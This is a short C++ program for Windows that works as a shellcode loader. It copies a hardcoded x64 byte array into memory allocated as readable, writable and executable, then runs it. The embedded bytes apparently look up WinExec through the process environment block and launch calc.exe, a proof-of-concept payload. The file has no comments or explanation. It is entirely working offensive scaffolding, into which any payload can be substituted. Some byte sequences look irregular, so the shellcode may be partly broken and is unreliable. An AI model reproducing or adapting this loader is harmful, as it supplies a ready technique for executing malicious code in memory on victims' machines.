#include <windows.h>
#include <iostream>

unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60"
"\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b"
"\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x8b\x93\x88\x00\x00"
"\x00\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d"
"\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x50"
"\x48\x89\xe0\x48\x83\xc4\x08\xeb\x00\x67\xe3\x19\x31\xdb\x41\x8b"
"\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b\x74\x02"
"\x75\xe7\x51\xeb\x01\xcc\x41\x5f\x78\x00\x4c\x89\xf9\x4d\x31\xdb"
"\x44\x8b\x5a\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d"
"\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x04\xab\x4c\x01\xc0"
"\x50\x78\x00\x41\x5f\xb8\x00\x00\x00\x00\x50\x48\xb8\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\xba\x01\x00\x00\x00\x48\x83"
"\xec\x30\x41\xff\xd7";

int main() {
    
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);
    shellcode_func();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}